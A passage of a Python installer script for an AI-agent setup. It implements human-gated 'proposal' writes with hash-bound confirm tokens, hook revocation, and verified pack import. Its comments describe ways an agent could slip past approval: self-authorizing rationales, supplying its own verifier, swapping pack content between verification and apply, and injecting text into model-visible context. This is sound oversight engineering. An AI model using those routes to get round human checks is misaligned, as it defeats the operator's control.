        return input("write these entries? [y/N] ").strip().lower() in ("y", "yes")
    except EOFError:
        # Interactive BY DESIGN — but say WHY, or an automation author sees a
        # silent "not written." and a rc of 1 with nothing to act on
        # (2026-09-19, Grok P2).
        print("no TTY to ask on, and CI is not 'true' — this gate is "
              "interactive by design. In automation, run it as: "
              "CI=true install.py --target ... --approve memory-hooks --apply "
              "(which means 'I have read the staged diff above and affirm it').",
              file=sys.stderr)
        return False


def revoke(target: Path, which: str) -> int:
    receipt = _load_receipt(target)
    if receipt is None:
        return die(f"no receipt at {target} — nothing to revoke.")
    record = (receipt.get("gated_writes") or {}).get(which)
    if not record:
        return die(f"{which!r} was never approved on this install — nothing to revoke.")
    if which != "memory-hooks":
        return die(f"{which!r} is not revocable.")
    settings = _settings_path(target)
    if not settings.exists():
        return die(f"{settings} is gone — nothing to remove.")
    before = settings.read_bytes()
    doc = json.loads(before)
    # Per EVENT, and per individual hook ITEM. Revoke used to drop every entry
    # in a group that contained any recorded command, taking a pre-existing
    # operator hook and anything they had appended to the same group with it
    # (2026-09-19 review, finding 4, executed as revoke_deletes_user_hooks).
    recorded = {event: set(cmds) for event, cmds in (record.get("entries") or {}).items()}
    hooks = doc.get("hooks", {})
    for event in list(hooks):
        mine = recorded.get(event, set())
        if not mine:
            continue
        kept_entries = []
        for e in hooks[event]:
            inner = [h for h in e.get("hooks", []) if h.get("command") not in mine]
            if inner:
                kept_entries.append(dict(e, hooks=inner))
            elif not e.get("hooks"):
                kept_entries.append(e)      # a group we never touched
        if kept_entries:
            hooks[event] = kept_entries
        else:
            del hooks[event]
    if not hooks:
        doc.pop("hooks", None)
    after = (json.dumps(doc, indent=2) + "\n").encode()
    print(f"--- {settings} (before)\n+++ {settings} (after)")
    for line in difflib.unified_diff(
            before.decode("utf-8", "replace").splitlines(),
            after.decode().splitlines(), lineterm="", n=2):
        print(line)
    if not _confirm_hook_write():
        print("not written.")
        return 1
    _atomic_write(settings, after)
    receipt["gated_writes"][which] = dict(
        record, revoked_at=_now(), written=False,
        revoked_sha=_sha256_bytes(after))
    _save_receipt(target, receipt)
    # `recorded` is a SET of command strings, so this is the number of distinct
    # commands removed, which is <= the number of recorded hook entries (two
    # events can register the same command). Say which, or the line reads as a
    # short count against the receipt — 6 vs 7 on a stock install.
    print(f"{which} revoked — {len(recorded)} distinct command(s) removed from {settings}.")
    return 0


def contract(target: Path, harness: str = None) -> int:
    """Run the six-property memory contract against this install."""
    test = target / "memory-mesh" / "contract_test.py"
    if not test.exists():
        return die(f"{test} not found — this install has no memory mesh to check.")
    argv = [sys.executable, str(test)]
    if harness:
        argv += ["--harness", harness]
    elif shutil.which("claude"):
        argv += ["--harness", "claude"]
    else:
        print("no harness on PATH — running the script half; the harness-turn "
              "properties will report SKIP, which is not a pass.")
    return subprocess.run(argv).returncode


# --- SEED-072 (2026-08-09): human-applied exact-diff proposal loop ---------
# Both Grok and Gemini, reviewing this backlog's own third-party assessment,
# independently proposed the same middle tier between "ambient cron" and a
# governed action broker: the agent writes a canonical intent (exact bytes,
# a hash binding what it saw, a rationale) to a file and stops; a human
# applies it with one command. Same covenant as claude-md/mesh-bootstrap
# above — the agent's role stops at writing the proposal file, install.py
# performs the one write — generalized to an open-ended shape (any target,
# not one bespoke flow per write) but deliberately allowlisted, not opened
# wide: SEED-072's own AC scopes v1 to scheduler-entry changes only.
# "Reversible filesystem actions" as a CLASS stays out of the allowlist for
# good: SEED-073 (the unattended Tier-1 grant) was declined 2026-08-09
# because a same-uid control is a convention, not a boundary. What widens
# is the list of NAMED files, one code change at a time.
#
# --- SEED-077 (2026-09-02): widened allowlist ---------------------------
# SEED-072 ran three weeks on manifest.yml alone in real use, so the lane
# widens — to NAMED files, never a class. Every entry must be (a)
# reversible through this same mechanism, (b) owned by the system itself
# (never human-owned state like goals or ledgers), and (c) validatable
# before the write (see _PROPOSAL_CHECKS). settings.json's presence is NOT
# an agent inference — the first submission's rationale ("the lane is
# doctrine's explicit authorization") was rejected in review as
# self-authorizing. It is here on Craig's own ruling, 2026-09-02, verbatim:
# "I am approving the change to settings.json as long as the changes are
# clearly communicated to me before making them." The condition is
# enforced in mechanism, not intent: settings.json proposals are excluded
# from --apply-proposals (PROPOSAL_SINGLE_APPLY_ONLY below); their FULL
# unified diff prints in --review-proposals and again at --apply-proposal
# time; and the apply REFUSES unless it carries --confirm TOKEN, where the
# token is a prefix of the after-content hash that only that diff output
# prints. "Communicated before making" is therefore two commands by
# construction (one shows, one writes), and the approval is bound to the
# exact bytes it was shown, not to the slug name.
PROPOSAL_ALLOWED_TARGETS = {
    "scheduler/manifest.yml",
    "observability/freshness.json",
    ".claude/settings.json",
}

# Targets the batch walker refuses to touch: each apply must be its own
# deliberate, slug-named human command, with the full diff in front of the
# human first. Guard-weakening surfaces belong here.
PROPOSAL_SINGLE_APPLY_ONLY = {".claude/settings.json"}

# Bound every output (Principle): a runaway diff truncates, never floods.
_PROPOSAL_DIFF_MAX_LINES = 200


def _print_proposal_diff(slug: str, rel_target: str, before: str, after: str):
    import difflib
    diff = list(difflib.unified_diff(
        before.splitlines(), after.splitlines(),
        fromfile=f"{rel_target} (current)", tofile=f"{rel_target} (proposed)",
        lineterm=""))
    print(f"--- full diff for '{slug}' ({rel_target} is single-apply-only; "
          f"review every line) ---")
    for line in diff[:_PROPOSAL_DIFF_MAX_LINES]:
        print(f"  {line}")
    if len(diff) > _PROPOSAL_DIFF_MAX_LINES:
        print(f"  ... truncated at {_PROPOSAL_DIFF_MAX_LINES} of {len(diff)} lines — "
              f"read the proposal file itself before applying.")


_CONFIRM_LEN = 12


def _confirm_token(after_content: str) -> str:
    """The token --apply-proposal must carry for a single-apply-only target:
    a prefix of after_content's own hash. It is printed only alongside the
    full diff, so possessing it means the diff was in front of the human;
    and it changes if the proposal's bytes change, so a re-staged proposal
    under the same slug cannot ride an earlier approval."""
    return _sha256_bytes(after_content.encode("utf-8")).split(":", 1)[-1][:_CONFIRM_LEN]


def _check_json_object(text: str):
    """after_content must parse as a JSON object — a proposal that would
    leave freshness.json or settings.json unreadable is refused before the
    write, not discovered by the next job that loads it."""
    try:
        parsed = json.loads(text)
    except ValueError as e:
        return f"after_content is not valid JSON ({e})"
    if not isinstance(parsed, dict):
        return "after_content parses but is not a JSON object"
    return None


def _check_manifest_yaml(text: str):
    """Structural sanity for scheduler/manifest.yml without a yaml import
    (stdlib-first): the jobs key must survive, tabs must not appear (YAML
    rejects them as indentation), and no two jobs may share a name — each
    is a mistake an agent-written full-file replacement can realistically
    make, and each would take the whole scheduler down, not one job."""
    if "jobs:" not in text:
        return "no 'jobs:' key — this would empty the scheduler"
    if "\t" in text:
        return "contains tab characters, which YAML rejects as indentation"
    names = [line.strip()[len("- name:"):].strip()
             for line in text.splitlines()
             if line.strip().startswith("- name:") and not line.strip().startswith("#")]
    dupes = {n for n in names if names.count(n) > 1}
    if dupes:
        return f"duplicate job name(s): {', '.join(sorted(dupes))}"
    return None


# Verification BEFORE apply, not after: each allowlisted target names the
# check its replacement bytes must pass. A check returns None (pass) or a
# reason string (refuse). Deliberately a fixed registry keyed by target —
# proposals never name their own check command; an agent-suppliable
# verifier is an agent-suppliable no-op.
_PROPOSAL_CHECKS = {
    "scheduler/manifest.yml": _check_manifest_yaml,
    "observability/freshness.json": _check_json_object,
    ".claude/settings.json": _check_json_object,
}


def _proposals_dir(target: Path) -> Path:
    return target / CC_SEED_DIR / STAGED_DIR / "proposals"


def _load_proposal_file(path: Path):
    if not path.exists():
        return None
    try:
        return json.loads(path.read_text())
    except (OSError, ValueError):
        return None


_SLUG_RE = re.compile(r"^[a-z0-9][a-z0-9_-]*$")


def _validate_slug(slug: str):
    """A slug becomes a path component in three places (staged, applied,
    the receipt key) — reject anything that isn't a plain filename-safe
    token before it's ever joined onto a Path (Grok's review, 2026-08-09:
    an unvalidated slug like '../x' or 'applied/foo' walks outside the
    proposals directory)."""
    if not _SLUG_RE.match(slug):
        die(f"'{slug}' is not a valid proposal slug (must match {_SLUG_RE.pattern}) — "
            f"refusing before it touches any path.")
        raise SystemExit(2)


def apply_proposal(target: Path, slug: str, confirm: str = None) -> int:
    _validate_slug(slug)
    with _proposal_lock(target):
        receipt = _load_receipt(target)
        if receipt is not None and slug in receipt.get("applied_proposals", {}):
            return die(f"'{slug}' was already applied — reusing a slug would overwrite its "
                       f"receipt history (before/after hashes, rationale) rather than "
                       f"recording a new event. Pick a new slug for a new change.")
        proposal = _load_proposal_file(_proposals_dir(target) / f"{slug}.json")
        if proposal is None:
            return die(f"no readable proposal at {_proposals_dir(target)}/{slug}.json — "
                       f"the agent writes this file (see PROPOSALS.md), you don't.")
        rel_target = proposal.get("target", "")
        if rel_target not in PROPOSAL_ALLOWED_TARGETS:
            return die(f"proposal targets {rel_target!r}, which is outside the allowed set "
                       f"({', '.join(sorted(PROPOSAL_ALLOWED_TARGETS))}) — widening the "
                       f"set is a code change to PROPOSAL_ALLOWED_TARGETS plus a matching "
                       f"_PROPOSAL_CHECKS entry, never a proposal. Refusing.")
        before_content = proposal.get("before_content", "")
        before_hash = proposal.get("before_sha256")
        if _sha256_bytes(before_content.encode("utf-8")) != before_hash:
            return die(f"proposal '{slug}' is malformed — its own before_content doesn't "
                       f"hash to its own before_sha256. Refusing rather than trusting a "
                       f"proposal that can't even check itself.")
        # Path safety before content: resolve (and refuse a symlink-swapped
        # directory component) BEFORE spending any effort validating
        # after_content, so a malformed proposal never masks the TOCTOU
        # refusal with the generic validity-check message (caught by the
        # symlink regression test after SEED-077 inserted the content check
        # ahead of this resolution, 2026-09-04).
        try:
            dir_fd, fname = _resolve_target_dir_fd(target, rel_target)
        except RuntimeError as e:
            return die(str(e))
        try:
            check = _PROPOSAL_CHECKS.get(rel_target)
            if check is None:
                return die(f"{rel_target} is allowlisted but has no _PROPOSAL_CHECKS entry — "
                           f"the two registries have drifted. Failing closed rather than "
                           f"writing unvalidated bytes; fix the registry first.")
            reason = check(proposal.get("after_content", ""))
            if reason is not None:
                return die(f"proposal '{slug}' fails the {rel_target} validity check: "
                           f"{reason}. Refusing before the write — ask the agent to "
                           f"re-propose content that passes.")
            try:
                current = _read_bytes_at(dir_fd, fname)
            except RuntimeError as e:
                return die(str(e))
            current_hash = _sha256_bytes(current)
            if before_hash != current_hash:
                return die(f"{target / rel_target} has changed since this proposal was written "
                           f"(expected {before_hash}, found {current_hash}) — the proposal is "
                           f"stale. Refusing rather than overwriting a file that moved out from "
                           f"under it; ask the agent to re-propose against the current content.")

            if receipt is None:
                return die(f"{target}/{CC_SEED_DIR}/{RECEIPT_NAME} not found — a proposal applied "
                           f"with no receipt to record it in can never be reverted through this "
                           f"mechanism. Refusing rather than making a change nothing can audit.")

            # Every refusal above ran against the LIVE file, so the diff shown
            # here is exactly what a confirmed re-run will write.
            token = _confirm_token(proposal.get("after_content", ""))
            if rel_target in PROPOSAL_SINGLE_APPLY_ONLY:
                _print_proposal_diff(slug, rel_target, before_content,
                                     proposal.get("after_content", ""))
                if confirm is None:
                    return die(f"{rel_target} is single-apply-only: nothing written. The diff "
                               f"above is the exact change; to make it, run\n"
                               f"  install.py --target {target} --apply-proposal {slug} "
                               f"--confirm {token}")
            if confirm is not None and confirm != token:
                return die(f"--confirm {confirm} does not match this proposal's after_content "
                           f"(expected {token}) — the bytes changed since you were shown the "
                           f"diff, or the token belongs to a different proposal. Nothing written; "
                           f"re-run --review-proposals and confirm what it prints.")
            after_bytes = proposal.get("after_content", "").encode("utf-8")
            after_hash = _sha256_bytes(after_bytes)
            _atomic_write_at(dir_fd, fname, after_bytes)
        finally:
            os.close(dir_fd)

        receipt.setdefault("applied_proposals", {})[slug] = {
            "target": rel_target, "applied_at": _now(),
            "before_sha256": before_hash, "after_sha256": after_hash,
            "rationale": proposal.get("rationale", ""),
        }
        _save_receipt(target, receipt)

        # Archived, not deleted — revert_proposal() reads before_content back out
        # of this exact file. Unlike the original comment here claimed, the
        # RECEIPT IS NOT a self-sufficient record of truth for revert: it stores
        # hashes, not bytes, so before_content lives ONLY in this archive (GPT-5.6
        # review, 2026-08-09). A failed rename is therefore a real, loud problem,
        # not a cosmetic one — the write to `dest` already succeeded and stays
        # applied; what's lost is the ability to revert it through this command.
        applied_dir = _proposals_dir(target) / "applied"
        applied_dir.mkdir(parents=True, exist_ok=True)
        src = _proposals_dir(target) / f"{slug}.json"
        archived = False
        try:
            src.rename(applied_dir / f"{slug}.json")
            archived = True
        except OSError as e:
            print(f"WARNING: applied successfully, but could not archive the proposal "
                  f"file ({e}) — --revert-proposal {slug} will NOT be possible; the "
                  f"receipt alone cannot supply before_content. Manually move {src} to "
                  f"{applied_dir}/{slug}.json to restore revert capability.", file=sys.stderr)

        print(f"applied proposal '{slug}' to {target / rel_target}")
        print(f"  {before_hash} -> {after_hash}")
        print(f"recorded in {target}/{CC_SEED_DIR}/{RECEIPT_NAME}")
        if archived:
            print(f"to undo: install.py --target {target} --revert-proposal {slug}")
        return 0


def revert_proposal(target: Path, slug: str) -> int:
    """Undo exactly one --apply-proposal call, and only if nothing has
    touched the target since — the same stale-state refusal apply_proposal
    itself uses, run in the opposite direction. Reads before_content back
    out of the archived proposal file apply_proposal() moved to applied/.

    Hardened 2026-08-09 after convergent findings from Grok/GPT-5.6/Gemini
    review: the receipt's `target` field and the archive's `before_content`
    are both same-UID-writable state, exactly like the manifest itself, and
    the original version trusted both without re-checking them against
    anything — an asymmetry with apply_proposal, which validates every one
    of these before writing. Revert now re-runs the SAME checks apply does,
    in the opposite direction: target stays on the allowlist, the archived
    proposal's own target must match the receipt's, and before_content must
    hash to the value recorded at apply time — not just to whatever the
    archive file happens to contain now. Same-day follow-up (wave2g2
    review, GPT+Gemini): the actual read/write of `target` also goes
    through the descriptor-relative resolution + flock apply_proposal
    uses, closing the symlink-swap/concurrent-modification TOCTOU window
    between the checks above and the restore."""
    _validate_slug(slug)
    with _proposal_lock(target):
        receipt = _load_receipt(target)
        if receipt is None:
            return die(f"{target}/{CC_SEED_DIR}/{RECEIPT_NAME} not found.")
        record = receipt.get("applied_proposals", {}).get(slug)
        if record is None:
            return die(f"no applied proposal named '{slug}' in the receipt — nothing to "
                       f"revert (already reverted, or never applied through this mechanism).")
        if "reverted_at" in record:
            return die(f"proposal '{slug}' was already reverted at {record['reverted_at']}.")
        rel_target = record.get("target", "")
        if rel_target not in PROPOSAL_ALLOWED_TARGETS:
            return die(f"receipt records target {rel_target!r} for '{slug}', which is outside "
                       f"the allowed set ({', '.join(sorted(PROPOSAL_ALLOWED_TARGETS))}) — "
                       f"refusing. (The receipt should never have this recorded; treat this "
                       f"as tampering, not a normal state.)")
        proposal = _load_proposal_file(_proposals_dir(target) / "applied" / f"{slug}.json")
        if proposal is None:
            return die(f"the archived proposal file for '{slug}' is gone — cannot recover "
                       f"the before-content to revert to. Receipt record for manual repair: "
                       f"{record}")
        if proposal.get("target") != rel_target:
            return die(f"the archived proposal's target ({proposal.get('target')!r}) doesn't "
                       f"match the receipt's ({rel_target!r}) for '{slug}' — refusing rather "
                       f"than trusting whichever one is wrong.")
        before_content = proposal.get("before_content", "")
        before_bytes = before_content.encode("utf-8")
        before_hash = _sha256_bytes(before_bytes)
        if before_hash != record["before_sha256"]:
            return die(f"the archived proposal's before_content no longer hashes to what "
                       f"--apply-proposal recorded at apply time (expected "
                       f"{record['before_sha256']}, found {before_hash}) — the archive file "
                       f"has been modified since applying. Refusing to restore bytes that "
                       f"don't match the audited record.")

        try:
            dir_fd, fname = _resolve_target_dir_fd(target, rel_target)
        except RuntimeError as e:
            return die(str(e))
        try:
            try:
                current = _read_bytes_at(dir_fd, fname)
            except RuntimeError as e:
                return die(str(e))
            current_hash = _sha256_bytes(current)
            if current_hash != record["after_sha256"]:
                return die(f"{target / rel_target} has changed since --apply-proposal ran (expected "
                           f"{record['after_sha256']}, found {current_hash}) — refusing to "
                           f"revert over a newer edit. Resolve by hand.")
            _atomic_write_at(dir_fd, fname, before_bytes)
        finally:
            os.close(dir_fd)

        record["reverted_at"] = _now()
        _save_receipt(target, receipt)
        print(f"reverted proposal '{slug}' — {target / rel_target} restored to {record['before_sha256']}")
        return 0


# --- SEED-077 (2026-09-02): batch review + apply ----------------------------
# The Monday proposal feed produces several proposals at once; applying them
# one slug at a time made the human the serial bottleneck the lane exists to
# remove. --review-proposals is the five-minute read (read-only, exit 0
# always); --apply-proposals walks the queue through the SAME per-slug
# apply_proposal() path — every guard (allowlist, self-hash, validity check,
# stale-live-hash, receipt, lock) runs per item, a refusal skips that item
# and keeps going, and the batch exits nonzero if anything was refused.
# Batch is a loop over the audited single, never a second write path.

def _staged_proposal_slugs(target: Path):
    """Valid-slug staged proposals, sorted for a deterministic apply order.
    Files whose stem fails _SLUG_RE are reported and skipped, not died on —
    one junk file must not block the rest of the queue."""
    d = _proposals_dir(target)
    if not d.is_dir():
        return [], []
    slugs, junk = [], []
    for p in sorted(d.glob("*.json")):
        if p.is_file():
            (slugs if _SLUG_RE.match(p.stem) else junk).append(p.stem)
    return slugs, junk


def review_proposals(target: Path) -> int:
    """Read-only queue report: for each staged proposal, would --apply-proposal
    take it right now, and why not if not. Never writes anything."""
    import difflib
    slugs, junk = _staged_proposal_slugs(target)
    for stem in junk:
        print(f"SKIP  {stem!r}: not a valid slug (agent wrote a junk filename?)")
    if not slugs:
        print(f"no staged proposals in {_proposals_dir(target)}")
        return 0
    for slug in slugs:
        proposal = _load_proposal_file(_proposals_dir(target) / f"{slug}.json")
        if proposal is None:
            print(f"BAD   {slug}: unreadable or not JSON")
            continue
        rel_target = proposal.get("target", "")
        rationale = proposal.get("rationale", "(no rationale)")
        before = proposal.get("before_content", "")
        after = proposal.get("after_content", "")
        problems = []
        if rel_target not in PROPOSAL_ALLOWED_TARGETS:
            problems.append(f"target {rel_target!r} not allowlisted")
        else:
            check = _PROPOSAL_CHECKS.get(rel_target)
            if check is None:
                problems.append("no validity check registered (registry drift)")
            else:
                reason = check(after)
                if reason is not None:
                    problems.append(f"fails validity check: {reason}")
        if _sha256_bytes(before.encode("utf-8")) != proposal.get("before_sha256"):
            problems.append("malformed (before_content doesn't hash to before_sha256)")
        elif rel_target in PROPOSAL_ALLOWED_TARGETS:
            live = target / rel_target
            try:
                live_hash = _sha256_bytes(live.read_bytes())
            except OSError as e:
                problems.append(f"cannot read live target ({e})")
            else:
                if live_hash != proposal.get("before_sha256"):
                    problems.append("stale (live file changed since proposed)")
        diff = list(difflib.unified_diff(before.splitlines(), after.splitlines(), lineterm=""))
        added = sum(1 for l in diff if l.startswith("+") and not l.startswith("+++"))
        removed = sum(1 for l in diff if l.startswith("-") and not l.startswith("---"))
        single = rel_target in PROPOSAL_SINGLE_APPLY_ONLY
        status = ("SOLO " if single else "READY") if not problems else "HELD "
        print(f"{status} {slug}  ->  {rel_target}  (+{added}/-{removed})")
        print(f"       {rationale}")
        for p in problems:
            print(f"       held: {p}")
        if single and not problems:
            _print_proposal_diff(slug, rel_target, before, after)
            print(f"       apply deliberately: install.py --target {target} "
                  f"--apply-proposal {slug} --confirm {_confirm_token(after)}")
    print(f"\napply everything READY: install.py --target {target} --apply-proposals")
    print(f"apply one:              install.py --target {target} --apply-proposal SLUG")
    print(f"single-apply-only:      ... --apply-proposal SLUG --confirm TOKEN  (token printed with its diff above)")
    return 0


def apply_proposals(target: Path) -> int:
    """Apply every staged proposal through apply_proposal(), one at a time,
    continuing past refusals. Exit 0 only if nothing was refused."""
    slugs, junk = _staged_proposal_slugs(target)
    for stem in junk:
        print(f"SKIP  {stem!r}: not a valid slug", file=sys.stderr)
    if not slugs:
        print(f"no staged proposals in {_proposals_dir(target)}")
        return 0
    refused, deferred = [], []
    for i, slug in enumerate(slugs, 1):
        proposal = _load_proposal_file(_proposals_dir(target) / f"{slug}.json")
        if proposal is not None and proposal.get("target") in PROPOSAL_SINGLE_APPLY_ONLY:
            # Craig's 2026-09-02 condition on settings.json: the change is
            # communicated before it is made. Batch is the wrong granularity
            # for that — leave it staged for a slug-named single apply.
            print(f"[{i}/{len(slugs)}] {slug} — DEFERRED: {proposal.get('target')} is "
                  f"single-apply-only; review the diff, then run "
                  f"--apply-proposal {slug} --confirm TOKEN yourself")
            deferred.append(slug)
            continue
        print(f"[{i}/{len(slugs)}] {slug}")
        if apply_proposal(target, slug) != 0:
            refused.append(slug)
    applied = len(slugs) - len(refused) - len(deferred)
    print(f"\n{applied} applied, {len(refused)} refused, {len(deferred)} deferred "
          f"of {len(slugs)} staged"
          + (f" — refused: {', '.join(refused)}" if refused else "")
          + (f" — deferred to single apply: {', '.join(deferred)}" if deferred else ""))
    return 0 if not refused else 2


# --- P3 (2026-08-08): cc-pack import ----------------------------------------
# install.py --approve import-pack --from-pack <path> is the write path the
# cc-pack design calls for: an agent may --inspect/--verify a pack freely
# (pack/import_pack.py, read-only), but only a human running --approve moves
# bytes — same covenant as claude-md/mesh-bootstrap above.

def _verify_pack_dir(pack_dir: Path):
    """Shells out to the SAME import_pack.py this clone ships (pack/, next
    to this file) rather than re-implementing SHA256SUMS/bijection/audience-
    gate checking a third time — that logic is already hardened and kept in
    sync with cc-pack/pack_lib.py by cc-pack/selftest.py's cross-fixture
    tests; a third copy here would be a third place for it to drift."""
    importer = HERE / "pack" / "import_pack.py"
    if not importer.exists():
        return False, f"{importer} not found — this clone is missing the pack importer (pack/import_pack.py)"
    if not pack_dir.exists():
        return False, f"{pack_dir} does not exist"
    try:
        r = subprocess.run([sys.executable, str(importer), "--pack", str(pack_dir), "--verify"],
                            capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return False, f"{importer} --verify timed out after 120s on {pack_dir}"
    return r.returncode == 0, (r.stdout + r.stderr).strip()


# P6c (2026-08-09): signature-verify state, machine-parsed from the SAME
# import_pack.py --verify call above — never a THIRD re-implementation of
# the ssh-keygen -Y logic (pack_lib.py is the second; import_pack.py's own
# copy is the declared-duplicate first). See pack_lib.py's POSTURE comment
# for why unsigned/invalid/unknown-signer/verification-error/verified is
# the right state set and why enforcement (this file's job) is kept
# separate from classification (import_pack.py's job).
_SIG_LINE_RE = re.compile(r"^signature:\s*(\S+)(?:\s+principal=(\S+))?", re.MULTILINE)

# Declared-duplicate constant of import_pack.py's SIG_STATES — this file
# never imports import_pack.py (it only shells out to it), so it can't
# import the tuple; kept in sync by hand like every other cross-file
# constant in this design. Used to validate the parsed 'signature:' word
# is actually one of the five known states before any policy decision is
# made on it (2026-08-09 post-implementation review, Grok + GPT
# independently HIGH: the regex captured ANY \S+ token with no allowlist —
# today's producer only ever emits one of these five, but a future
# diagnostic line, a dependency change in import_pack.py, or drift between
# this file and that one could put a different word in the capture group,
# and an unvalidated word flowing straight into "if sig_state == 'unsigned'"
# / "if sig_state not in (...)" comparisons could silently pick either
# branch depending on the string, or worse, an unrecognized-but-truthy
# value could slip past 'unsigned'-only checks. Fail closed to
# 'verification-error' on anything outside the known set — same posture as
# every other classification failure in this function.
_KNOWN_SIG_STATES = ("unsigned", "invalid", "unknown-signer", "verification-error", "verified")


def _verify_pack_signature(pack_dir: Path, allowed_signers):
    """Runs import_pack.py --verify --allowed-signers <path> (a SECOND call
    to the same tool _verify_pack_dir already made — cheap, and keeps this
    function's contract simple: it owns signature state, that one owns
    integrity state) and parses the 'signature: <state>[ principal=<x>]'
    line it prints. Returns (state, principal_or_None, raw_output). Fails
    closed to 'verification-error' if the line can't be found at all, OR if
    the captured state word isn't one of the five known SIG_STATES —
    never silently treated as unsigned or verified."""
    importer = HERE / "pack" / "import_pack.py"
    cmd = [sys.executable, str(importer), "--pack", str(pack_dir), "--verify"]
    if allowed_signers:
        cmd += ["--allowed-signers", str(allowed_signers)]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return "verification-error", None, "import_pack.py --verify timed out"
    out = r.stdout + r.stderr
    m = _SIG_LINE_RE.search(out)
    if not m:
        return "verification-error", None, out
    state = m.group(1)
    if state not in _KNOWN_SIG_STATES:
        return "verification-error", None, (
            f"import_pack.py --verify printed an unrecognized signature state "
            f"{state!r} (not one of {_KNOWN_SIG_STATES}) — refusing rather than "
            f"trust an unvalidated value:\n{out}")
    return state, m.group(2), out


def _stage_pack_copy(pack_dir: Path, staging_parent: Path) -> Path:
    """Copies pack_dir into a private, freshly-created staging directory
    BEFORE verification — closing the verify/apply TOCTOU all three
    2026-08-08 P3 reviewers found independently. The real-world race isn't
    nanoseconds: a human reads --approve's output and decides to run it,
    which is genuine wall-clock time an agent with write access to pack_dir
    (the normal "agent stages, human approves" shape this whole design
    exists for) could use to substitute content after --verify passed but
    before _apply_pack_generic copies it — and _apply_pack_generic only
    re-checks PATH SAFETY, never re-checks content against SHA256SUMS, so
    whatever bytes are there at copy time get blessed into the receipt
    outright. Verifying and applying the SAME snapshot — one nothing else
    can reach once this function returns — removes the window instead of
    narrowing it. Refuses to stage anything that isn't a regular file or
    directory (no symlinks, fifos, devices) so a hostile pack_dir can't
    smuggle a symlink through the copy itself."""
    stage = Path(tempfile.mkdtemp(prefix=".cc-pack-stage-", dir=str(staging_parent)))
    try:
        for p in sorted(pack_dir.rglob("*")):
            rel = p.relative_to(pack_dir)
            dst = stage / rel
            st = p.lstat()
            if stat.S_ISDIR(st.st_mode):
                dst.mkdir(parents=True, exist_ok=True)
            elif stat.S_ISREG(st.st_mode):
                dst.parent.mkdir(parents=True, exist_ok=True)
                dst.write_bytes(p.read_bytes())
            else:
                raise RuntimeError(
                    f"{p}: not a regular file or directory (refusing to stage a "
                    f"symlink/fifo/device from an unverified pack directory)")
    except (RuntimeError, OSError):
        shutil.rmtree(stage, ignore_errors=True)
        raise
    return stage


def _read_pack_manifest(pack_dir: Path):
    p = pack_dir / "pack.json"
    if not p.exists():
        return None
    try:
        data = json.loads(p.read_text())
    except (json.JSONDecodeError, OSError):
        return None
    return data if isinstance(data, dict) else None


def _apply_pack_generic(pack_dir: Path, manifest: dict, dest_root: Path) -> dict:
    """Copies every file every part declares to dest_root/parts/<id>/<relfile>
    — the same generic, delivery-root-only placement as pack_lib.Part.apply's
    default (see that docstring for the P3 scope cut). Re-validates every
    path here too: never trust that --verify a moment ago is still true of
    the bytes about to be copied. Returns {"parts/<id>/<relfile>": sha256}
    for the receipt."""
    paths = {}
    for part in manifest.get("parts", []) or []:
        if not isinstance(part, dict):
            continue
        pid = part.get("id")
        if not _pack_is_safe_component(pid):
            raise RuntimeError(f"refusing to apply: part id {pid!r} is not a safe path component")
        files = part.get("files", [])
        if not isinstance(files, list):
            continue
        for f in files:
            if not _pack_is_safe_relpath(f):
                raise RuntimeError(f"refusing to apply: unsafe file entry {f!r} in part {pid!r}")
            src = pack_dir / "parts" / pid / f
            dst = dest_root / "parts" / pid / f
            dst.parent.mkdir(parents=True, exist_ok=True)
            data = src.read_bytes()
            dst.write_bytes(data)
            paths[f"parts/{pid}/{f}"] = _sha256_bytes(data)
    return paths


def _render_packs_md(receipt: dict) -> bytes:
    """Pure function of receipt['imported_packs'] — re-derived on every
    import/removal, never hand-edited. Sorted by pack id so A-then-B and
    B-then-A produce byte-identical output; one labeled section per pack,
    provenance kept separate rather than blended (mirrors agy-bundle/
    build.py's renderer shape)."""
    packs = receipt.get("imported_packs", {}) or {}
    lines = [
        "# Imported packs",
        "",
        "Rendered by install.py from .cc-seed/receipt.json — do not hand-edit; "
        "the next `--approve import-pack` or `--remove-pack` regenerates this file.",
        "",
    ]
    if not packs:
        lines.append("(none imported yet)")
    for pid in sorted(packs):
        p = packs[pid]
        # PACKS.md is the file @-imported straight into CLAUDE.md, so every
        # field here is effectively model-visible context — sanitize before
        # rendering (2026-08-08 P3 review, Grok + GPT: an unescaped
        # source_pack/tags/kind pulled from the receipt could embed
        # newlines/control sequences and inject extra lines or markdown).
        lines += [
            f"## {_escape_path(str(pid))}",
            "",
            f"- kind: {_escape_path(str(p.get('kind')))}",
            f"- audience: {_escape_path(str(p.get('audience')))}",
            f"- tags: {_escape_path(', '.join(str(t) for t in (p.get('tags') or [])) or '(none)')}",
            f"- imported: {_escape_path(str(p.get('approved_at')))}",
            f"- source pack: {_escape_path(str(p.get('source_pack')))}",
            f"- sha256sums_sha256: {_escape_path(str(p.get('sha256sums_sha256')))}",
            f"- files: {len(p.get('paths') or {})}",
            "",
        ]
    return ("\n".join(lines) + "\n").encode()


def _strip_pack_pointer_prefix(data: bytes, receipt: dict) -> bytes:
    """If an APPROVED cc-pack pointer region sits at the very start of
    `data`, strip it (region + its separator) before any cc-seed-region
    reasoning runs on the rest. check 3 owns the cc-seed claude-md region and
    must not double-count an approved, separately-owned pack region as
    'unexplained content outside the region' when diffing against the
    pre-install baseline — the two gated writes compose in the same file
    (pack pointer always first, cc-seed region always last; see the
    GATED_WRITES comment above), so check 3 needs to look straight through
    the pack region to find what it actually owns."""
    gw = receipt.get("gated_writes", {}).get("import-pack-pointer")
    if not gw or not gw.get("written"):
        return data
    s_marker, e_marker = PACKS_MARKER_START.encode(), PACKS_MARKER_END.encode()
    if not data.startswith(s_marker):
        return data
    e_idx = data.find(e_marker)
    if e_idx == -1:
        return data
    end = e_idx + len(e_marker) + 1  # past the end marker AND its own guaranteed trailing \n
    # _write_packs_pointer's "\n\n" separator (when anything follows the pack
    # region) must be consumed as a pair, matching how it was written — a
    # single \n here was the 2026-08-08 bug (see _write_packs_pointer).
    if data[end:end + 2] == b"\n\n":
        return data[end + 2:]
    return data[end:]


def _write_packs_pointer(target: Path, receipt: dict, delivery_root: Path) -> bool:
    """Writes the one-line @<delivery_root>/PACKS.md pointer into
    target/CLAUDE.md — ONCE ever per target (packs 2..N regenerate PACKS.md
    and touch CLAUDE.md zero times). _lib/context_build.py's IMPORT_RE
